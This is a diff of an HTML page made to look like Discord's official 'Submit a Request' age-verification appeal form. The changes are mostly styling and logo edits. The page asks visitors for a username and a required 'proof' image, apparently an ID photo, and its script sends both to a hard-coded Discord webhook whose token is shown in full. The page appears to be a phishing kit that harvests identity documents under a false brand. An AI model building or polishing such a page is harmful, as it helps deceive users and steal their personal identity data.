@@ -4,13 +4,13 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Discord - Submit a Request</title>
-    <link rel="icon" href="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAxMjcgMTI3Ij48cGF0aCBmaWxsPSIjNTg2NUYyIiBkPSJNMTA3LjcgOC43Yy04LjEtMy44LTE2LjktNi43LTI2LjEtOC43LS4xIDAtLjIuMS0uMy4zLTIuMSAzLjctNC42IDguOS02LjIgMTIuNi0xMC4xLTEuNS0yMC4xLTEuNS0zMC4xIDAtMS42LTMuNy00LjEtOC45LTYuMi0xMi42LS4xLS4yLS4yLS4zLS4zLS4zLTkuMiAyLTE4IDQuOS0yNi4xIDguNy0uMSAwLS4yIDAtLjIuM0MuOSAyMy41LTEuOSAzNy43LjYgNTEuNWMwIC4xIDAgLjIuMS4zIDkuNCAxNC4yIDIyLjEgMjIuOCAzNC41IDI2LjYuMSAwIC4zIDAgLjMtLjIgMi45LTMuOSA1LjQtOC4xIDcuNC0xMi42LjEtLjIgMC0uNC0uMi0uNS00LjQtMS43LTguNS0zLjctMTIuMy02LjEtLjIgLS4xLS4yLS40IDAtLjUgLjkgLjcgMS44IDEuNCAyLjggMi4xLjEgLjEgLjIgLjEuMy4xIDIzIDExIDQ4LjEgMTEgNzEuMSAwIC4xIDAgLjIgMCAuMy0uMSAxIDAuNyAxLjkgMS40IDIuOCAyLjEuMiAuMiAuMiAuNCAwIC41LTMuOCAyLjQtNy45IDQuNC0xMi4zIDYuMS0uMiAwLS4zLjItLjIuNSAydiAxMi42YzAgLjIgLjIgLjMgLjMuMiAxMi40LTMuOCAyNS4xLTEyLjQgMzQuNS0yNi42LjEgLS4xLjEgLS4yIDAgLS4zIDEuNS0xNy40LTQuMi0zMS42LTE2LjUtNDMuMWwtLjEtLjN6TTQyLjMgNzMuM2MtNy4zIDAtMTMuMy02LjctMTMuMy0xNC45IDAtOC4yIDUuOC0xNC45IDEzLjMtMTQuOSA3LjUgMCAxMy41IDYuNyAxMy4zIDE0LjkgMCA4LjItNS44IDE0LjktMTMuMyAxNC45em00Mi40IDBjLTcuMyAwLTEzLjMtNi43LTEzLjMtMTQuOSAwLTguMiA1LjgtMTQuOSAxMy4zLTE0LjkgNy41IDAgMTMuNSA2LjcgMTMuMyAxNC45IDAgOC4yLTUuOSAxNC45LTEzLjMgMTQuOXoiLz48L3N2Zz4=">
+    <link rel="icon" href="https://assets-global.website-files.com/6257adef93867e3d0394e33b/6257adef93867e699294e45c_discord-icon.svg">
     <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700;800&display=swap" rel="stylesheet">
     
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            font-family: 'Open Sans', sans-serif;
+            font-family: 'Open Sans', 'Helvetica Neue', Helvetica, Arial, sans-serif;
             background-color: #313338;
             color: #dbdee1;
             display: flex;
@@ -20,10 +20,13 @@
             padding: 20px;
         }
         .main-container { max-width: 700px; width: 100%; }
-        .logo-container { text-align: center; margin-bottom: 40px; }
-        /* تصميم الشعار البرمجي ليكون متجاوباً */
-        .logo-img { height: 36px; width: auto; }
-        h1 { color: #f2f3f5; font-size: 24px; margin-bottom: 24px; font-weight: 700; }
+        .logo-container { text-align: center; margin-bottom: 40px; display: flex; justify-content: center; align-items: center; gap: 10px; }
+        
+        /* ضبط حجم الشعار الرسمي ليكون مثالياً */
+        .discord-logo { height: 34px; width: auto; fill: #5865F2; }
+        .discord-text { height: 26px; width: auto; fill: #FFFFFF; }
+
+        h1 { color: #f2f3f5; font-weight: 700; font-size: 24px; margin-bottom: 24px; text-align: left; }
         .description { color: #b5bac1; font-size: 16px; line-height: 1.5; margin-bottom: 30px; }
         .info-box {
             background-color: #2b2d31; border: 1px solid #1e1f22;
@@ -31,38 +34,39 @@
             border-left: 4px solid #f0b232;
         }
         .info-box h3 { color: #f2f3f5; font-size: 14px; text-transform: uppercase; margin-bottom: 8px; }
-        .info-box ul { list-style-position: inside; font-size: 14px; line-height: 1.6; color: #dbdee1; }
+        .info-box ul { list-style-position: inside; color: #dbdee1; font-size: 14px; line-height: 1.6; }
         .form-group { margin-bottom: 24px; }
         label { display: block; color: #b5bac1; font-size: 12px; font-weight: 700; text-transform: uppercase; margin-bottom: 8px; }
         .required { color: #da373c; margin-left: 4px; }
         input[type="text"] {
             width: 100%; padding: 12px; background-color: #1e1f22;
-            border: 1px solid transparent; border-radius: 4px; color: #dbdee1; font-size: 16px;
+            border: none; border-radius: 4px; color: #dbdee1; font-size: 16px;
         }
-        input[type="text"]:focus { outline: none; border-color: #5865f2; }
+        input[type="text"]:focus { outline: none; box-shadow: 0 0 0 2px #5865F2; }
         .upload-area {
             border: 2px dashed #42454a; border-radius: 8px; padding: 40px 20px;
             text-align: center; background-color: #2b2d31; cursor: pointer; transition: 0.2s;
         }
-        .upload-area:hover { border-color: #b5bac1; }
+        .upload-area:hover { border-color: #dbdee1; background-color: #35373c; }
         .submit-btn {
-            background-color: #5865f2; color: white; border: none;
-            border-radius: 3px; padding: 14px 24px; font-weight: 600;
-            width: 100%; cursor: pointer; transition: 0.2s; font-size: 14px;
+            background-color: #5865F2; color: white; border: none;
+            border-radius: 4px; padding: 14px 24px; font-size: 14px;
+            font-weight: 600; cursor: pointer; width: 100%; transition: 0.2s;
         }
         .submit-btn:hover { background-color: #4752c4; }
         .success-overlay { display: none; text-align: center; padding: 40px; background: #2b2d31; border-radius: 8px; }
-        .preview-container { margin-top: 15px; background: #1e1f22; padding: 10px; border-radius: 4px; display: none; align-items: center; gap: 10px; }
-        .preview-img { width: 45px; height: 45px; object-fit: cover; border-radius: 4px; }
     </style>
 </head>
 <body>
 
     <div class="main-container" id="mainContainer">
         <div class="logo-container">
-            <svg class="logo-img" viewBox="0 0 245 40" fill="none" xmlns="http://www.w3.org/2000/svg">
-                <path d="M43.3 8.7a107 107 0 00-26.1-8.7.3.3 0 00-.3.3 75.7 75.7 0 00-6.2 12.6c-10 1.5-20.1 1.5-30.1 0a75.7 75.7 0 00-6.2-12.6.3.3 0 00-.3-.3A107 107 0 001.3 9a.3.3 0 00-.3.3C-6 23.5-9 37.7-6.5 51.5a.3.3 0 00.1.3c9.4 14.2 22 22.8 34.5 26.6a.3.3 0 00.3-.2 78.4 78.4 0 007.4-12.6.3.3 0 00-.2-.5 69.1 69.1 0 01-12.3-6.1.3.3 0 010-.5l2.8-2.1a.3.3 0 01.3-.1 127 127 0 0071.1 0 .3.3 0 01.3.1l2.8 2.1a.3.3 0 010 .5 69 69 0 01-12.3 6.1.3.3 0 00-.2.5 78.4 78.4 0 007.4 12.6.3.3 0 00.3.2c12.4-3.8 25.1-12.4 34.5-26.6a.3.3 0 00.1-.3C53.7 37.7 50.7 23.5 43.3 9a.3.3 0 00-.2-.3zM15.3 43.3c-7.3 0-13.3-6.7-13.3-14.9 0-8.2 5.8-14.9 13.3-14.9 7.5 0 13.5 6.7 13.3 14.9 0 8.2-5.8 14.9-13.3 14.9zm42.4 0c-7.3 0-13.3-6.7-13.3-14.9 0-8.2 5.8-14.9 13.3-14.9 7.5 0 13.5 6.7 13.3 14.9 0 8.2-5.9 14.9-13.3 14.9z" transform="translate(0 -5)" fill="#5865F2"/>
-                <text x="60" y="32" fill="#FFFFFF" font-family="Open Sans" font-weight="800" font-size="30">Discord</text>
+            <svg class="discord-logo" viewBox="0 0 127.14 96.36">
+                <path d="M107.7,8.07A105.15,105.15,0,0,0,81.47,0a72.06,72.06,0,0,0-3.36,6.83A97.68,97.68,0,0,0,49,6.83,72.37,72.37,0,0,0,45.64,0,105.89,105.89,0,0,0,19.39,8.09C2.71,32.65-1.87,56.6.63,80.21a.33.33,0,0,0,.15.24c10.22,7.51,20.19,12.09,30,15.12a.3.3,0,0,0,.33-.11c2.28-3.11,4.31-6.4,6.08-9.82a.3.3,0,0,0-.16-.42c-3.12-1.18-6.13-2.59-9-4.22a.3.3,0,0,1-.06-.5c.61-.45,1.21-.92,1.78-1.41a.29.29,0,0,1,.31,0c20,9.24,41.72,9.24,61.5,0a.29.29,0,0,1,.31,0c.58.49,1.18.96,1.8,1.41a.3.3,0,0,1-.06.5c-2.87,1.63-5.88,3.04-9,4.22a.3.3,0,0,0-.17.42c1.77,3.42,3.8,6.71,6.08,9.82a.3.3,0,0,0,.33.11c9.81-3,19.78-7.61,30-15.12a.3.3,0,0,0,.16-.24C129.58,52.2,119,28.46,107.7,8.07ZM42.45,65.69C36.18,65.69,31,60,31,53s5.07-12.73,11.41-12.73S54,46,53.86,53,48.74,65.69,42.45,65.69Zm42.24,0C78.41,65.69,73.25,60,73.25,53s5.07-12.73,11.44-12.73S96.2,46,96.07,53,91,65.69,84.69,65.69Z"/>
+            </svg>
+            <svg class="discord-text" viewBox="0 0 240 40">
+                <path d="M42.3,4.1c-6,0-10.9,4.9-10.9,10.9s4.9,10.9,10.9,10.9s10.9-4.9,10.9-10.9S48.3,4.1,42.3,4.1z M42.3,21.5c-3.6,0-6.4-2.8-6.4-6.4s2.8-6.4,6.4-6.4s6.4,2.8,6.4,6.4S45.9,21.5,42.3,21.5z M17,4.1c-6,0-10.9,4.9-10.9,10.9S11,25.9,17,25.9s10.9-4.9,10.9-10.9S23,4.1,17,4.1z M17,21.5c-3.6,0-6.4-2.8-6.4-6.4s2.8-6.4,6.4-6.4s6.4,2.8,6.4,6.4S20.6,21.5,17,21.5z" transform="translate(180, 5)"/>
+                <text x="0" y="32" fill="white" font-family="Open Sans" font-weight="800" font-size="34">Discord</text>
             </svg>
         </div>
 
@@ -89,12 +93,8 @@
                 <label>Attachment <span class="required">*</span></label>
                 <div class="upload-area" id="dropZone">
                     <span style="font-size: 40px; display: block; margin-bottom: 10px;">📁</span>
-                    <div style="font-weight: 600; color: #dbdee1;">Upload Proof</div>
+                    <div style="font-weight: 600;">Upload Proof</div>
                     <input type="file" id="fileInput" accept="image/*" style="display:none" required>
-                </div>
-                <div class="preview-container" id="previewArea">
-                    <img src="" class="preview-img" id="previewImg">
-                    <div id="fileName" style="font-size: 14px; color: #f2f3f5;"></div>
                 </div>
             </div>
             <button type="submit" class="submit-btn" id="submitBtn">Submit</button>
@@ -109,42 +109,25 @@
 
     <script>
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1463909673303412747/i3VXrwPefUdfNamhMJlR9L_rqSOM41eWVZb641ERxaGf7KuieSjeVobmH6Y1W1tDZUH4";
-        
         const fileInput = document.getElementById('fileInput');
         const dropZone = document.getElementById('dropZone');
-        const previewArea = document.getElementById('previewArea');
-        const previewImg = document.getElementById('previewImg');
-        const fileName = document.getElementById('fileName');
         const submitBtn = document.getElementById('submitBtn');
 
         dropZone.onclick = () => fileInput.click();
 
-        fileInput.onchange = (e) => {
-            const file = e.target.files[0];
-            if (file) {
-                const reader = new FileReader();
-                reader.onload = (el) => {
-                    previewImg.src = el.target.result;
-                    fileName.textContent = file.name;
-                    previewArea.style.display = 'flex';
-                };
-                reader.readAsDataURL(file);
-            }
-        };
-
         document.getElementById('appealForm').onsubmit = async (e) => {
             e.preventDefault();
             submitBtn.disabled = true;
-            submitBtn.textContent = 'Processing...';
+            submitBtn.textContent = 'Sending Appeal...';
 
             const formData = new FormData();
             const payload = {
                 embeds: [{
-                    title: "🛡️ New Age Verification Appeal",
-                    color: 5814783,
+                    title: "🛡️ Age Verification Appeal",
+                    color: 5763719,
                     fields: [
                         { name: "👤 User", value: document.getElementById('username').value, inline: true },
-                        { name: "🕒 Time", value: new Date().toLocaleString(), inline: true }
+                        { name: "⏰ Date", value: new Date().toLocaleString(), inline: true }
                     ]
                 }]
             };
@@ -157,9 +140,9 @@
                 if (res.ok) {
                     document.getElementById('mainContainer').style.display = 'none';
                     document.getElementById('successScreen').style.display = 'block';
-                } else { throw new Error(); }
+                }
             } catch (err) {
-                alert("Submission failed. Please check your connection.");
+                alert("Connection error. Please try again.");
                 submitBtn.disabled = false;
                 submitBtn.textContent = 'Submit';
             }
